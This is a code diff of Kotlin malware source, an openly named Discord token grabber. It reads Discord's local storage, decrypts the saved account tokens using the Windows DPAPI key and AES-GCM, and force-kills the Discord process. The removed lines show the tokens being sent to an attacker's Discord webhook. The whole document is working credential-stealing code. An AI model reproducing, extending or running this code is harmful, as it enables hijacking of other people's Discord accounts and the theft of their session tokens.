@@ -1,20 +1,24 @@
-package grabbers
+package services.discord
 
 import com.sun.jna.platform.win32.Crypt32Util
 import org.json.JSONObject
+import services.Discord
 import utils.DiscordWebhook
 import java.io.BufferedReader
 import java.io.File
 import java.io.FileReader
+import java.io.InputStreamReader
 import java.util.*
 import javax.crypto.Cipher
 import javax.crypto.spec.GCMParameterSpec
 import javax.crypto.spec.SecretKeySpec
 
-object DiscordTokenGrabber {
+object TokenGrabber {
     val romaing = System.getenv("APPDATA")
 
     fun getTokens(): List<String>? {
+        killProcess()
+
         val key = getKey()
         val tokens = getTokensFromFile()
         if (key == null) return null
@@ -30,7 +34,7 @@ object DiscordTokenGrabber {
     private fun getTokensFromFile(): List<String> {
         val token = LinkedList<String>()
         val regex = "dQw4w9WgXcQ:"
-        val files = File("${System.getenv("APPDATA")}\\discord\\Local Storage\\leveldb\\").listFiles()
+        val files = File("$romaing\\discord\\Local Storage\\leveldb\\").listFiles()
         files?.forEach { file ->
             BufferedReader(FileReader(file)).use { br ->
                 var line: String?
@@ -43,17 +47,17 @@ object DiscordTokenGrabber {
     }
 
     private fun getKey(): String? {
-        BufferedReader(FileReader(File("${System.getenv("APPDATA")}\\discord\\Local State"))).use { brs ->
+        BufferedReader(FileReader(File("$romaing\\discord\\Local State"))).use { brs ->
             var line: String?
             while (brs.readLine().also { line = it } != null) {
-                return org.json.JSONObject(line).getJSONObject("os_crypt").getString("encrypted_key")
+                return JSONObject(line).getJSONObject("os_crypt").getString("encrypted_key")
             }
         }
         return null
     }
 
     private fun decrypt(token: ByteArray, key: ByteArray): String {
-        val finalKey = com.sun.jna.platform.win32.Crypt32Util.cryptUnprotectData(key)
+        val finalKey = Crypt32Util.cryptUnprotectData(key)
         val finalToken = ByteArray(12) { i -> token[i + 3] }
         val data = ByteArray(token.size - 15) { i -> token[i + 15] }
         val cipher = Cipher.getInstance("AES/GCM/NoPadding")
@@ -61,20 +65,16 @@ object DiscordTokenGrabber {
         return String(cipher.doFinal(data))
     }
 
-    fun send() {
-        val tokens = getTokens()
-        if (tokens == null) return
-        if (tokens.isEmpty()) return
+    private fun killProcess() {
+        try {
+            val process = ProcessBuilder("tasklist").start()
+            val reader = BufferedReader(InputStreamReader(process.inputStream))
+            reader.lines().anyMatch { it.contains("discord", ignoreCase = true) }
 
-        Main.generateWebhook().apply {
-            embeds.add(
-                DiscordWebhook.EmbedObject()
-                    .setTitle("Discord token detected")
-
-                    .setDescription("tokens: ${tokens.joinToString(", ")}")
-            )
-            execute()
+            ProcessBuilder("taskkill", "/F", "/IM", "discord.exe").start().waitFor()
+        } catch (e: Exception) {
+            e.printStackTrace()
+            false
         }
     }
-
 }
